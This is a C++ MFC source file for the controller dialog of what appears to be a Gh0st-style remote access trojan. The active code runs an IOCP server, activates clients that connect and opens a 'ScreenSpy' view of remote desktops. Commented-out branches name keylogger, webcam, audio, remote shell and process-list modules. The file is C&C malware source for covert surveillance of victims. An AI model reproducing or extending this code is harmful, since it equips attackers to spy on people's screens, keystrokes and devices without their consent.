// MonitorDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Monitor.h"
#include "MonitorDlg.h"
#include "iocp/IOCPServer.h"
#include "ScreenSpyDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


CIOCPServer *m_iocpServer = NULL;


// CMonitorDlg dialog
CMonitorDlg::CMonitorDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CMonitorDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMonitorDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CMonitorDlg, CDialog)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDC_BTNMONITOR, &CMonitorDlg::OnBnClickedBtnmonitor)
END_MESSAGE_MAP()


// CMonitorDlg message handlers

BOOL CMonitorDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	// TODO: Add extra initialization here

	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CMonitorDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this function to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CMonitorDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

ClientContext *g_pContext = NULL;

LRESULT CMonitorDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
//	g_pContext = pContext;

	CScreenSpyDlg *dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SCREENSPY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

void CMonitorDlg::ProcessReceiveComplete(ClientContext *pContext)
{
	if (!pContext)
	{
		return;
	}

	CDialog	*pMgrDlg = (CDialog	*)pContext->m_Dialog[1];

	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case FILEMANAGER_DLG:
			//((CFileManagerDlg *)dlg)->OnReceiveComplete();
			break;
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)pMgrDlg)->OnReceiveComplete();
			break;
		//case WEBCAM_DLG:
		//	((CWebCamDlg *)dlg)->OnReceiveComplete();
		//	break;
		//case AUDIO_DLG:
		//	((CAudioDlg *)dlg)->OnReceiveComplete();
		//	break;
		//case KEYBOARD_DLG:
		//	((CKeyBoardDlg *)dlg)->OnReceiveComplete();
		//	break;
		//case SYSTEM_DLG:
		//	((CSystemDlg *)dlg)->OnReceiveComplete();
		//	break;
		//case SHELL_DLG:
		//	((CShellDlg *)dlg)->OnReceiveComplete();
		//	break;
		default:
			break;
		}
		return;
	}

	switch (pContext->m_DeCompressBuf.GetBuffer(0)[0])
	{
	case TOKEN_AUTH: // 要求验证
	//	m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
		break;
	case TOKEN_HEARTBEAT: // 回复心跳包
		{
		//	BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
	//	m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}

		break;
	case TOKEN_LOGIN: // 上线包
		{

			//if (m_iocpServer->m_nMaxConnections <= g_pConnectView->GetListCtrl().GetItemCount())
			//{
			//	closesocket(pContext->m_Socket);
			//}
			//else
			//{
			//	pContext->m_bIsMainSocket = true;
			//	//g_pConnectView->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
			//}
			//// 激活
			BYTE bToken = COMMAND_ACTIVED;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}

		break;
	case TOKEN_DRIVE_LIST: // 驱动器列表
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
		//g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO: //
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
		((CMonitorApp*)AfxGetApp())->m_dlgMonitor->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	//case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
	//	g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
	//	break;
	//case TOKEN_AUDIO_START: // 语音
	//	g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
	//	break;
	//case TOKEN_KEYBOARD_START:
	//	g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
	//	break;
	//case TOKEN_PSLIST:
	//	g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
	//	break;
	//case TOKEN_SHELL_START:
	//	g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
	//	break;
		// 命令停止当前操作
	default:
		closesocket(pContext->m_Socket);
		break;
	}	
}

void CMonitorDlg::ProcessReceive(ClientContext *pContext)
{
	if (!pContext)
		return;

	CDialog	*pMgrDlg = (CDialog	*)pContext->m_Dialog[1];
	if (!pMgrDlg)
	{
		return;
	}

	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)pMgrDlg)->OnReceive();
			break;
		case WEBCAM_DLG:
			//((CWebCamDlg *)pMgrDlg)->OnReceive();
			break;
		case AUDIO_DLG:
			//((CAudioDlg *)pMgrDlg)->OnReceive();
			break;
		default:
			break;
		}
		return;
	}
}

void CALLBACK CMonitorDlg::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
	CMonitorDlg* pFrame = (CMonitorDlg*) lpParam;

	switch (nCode)
	{
	case NC_CLIENT_CONNECT:
		{
			//g_pContext = pContext;
		}
		break;
	case NC_CLIENT_DISCONNECT:
		//PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
		break;
	case NC_TRANSMIT:
		break;
	case NC_RECEIVE:
		ProcessReceive(pContext);
		break;
	case NC_RECEIVE_COMPLETE:
		ProcessReceiveComplete(pContext);
		break;
	}
}

void CMonitorDlg::Activate(UINT nPort, UINT nMaxConnections)
{
	if (m_iocpServer != NULL)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;
	}

	m_iocpServer = new CIOCPServer;

	if (!m_iocpServer->Initialize(NotifyProc, this, 100000, nPort))
	{
		AfxMessageBox("IOCP Server Init Failed!");
	}
}

void CMonitorDlg::OnBnClickedBtnmonitor()
{
	BYTE bToken = COMMAND_SCREEN_SPY;
	m_iocpServer->Send(g_pContext, &bToken, sizeof(BYTE));
}
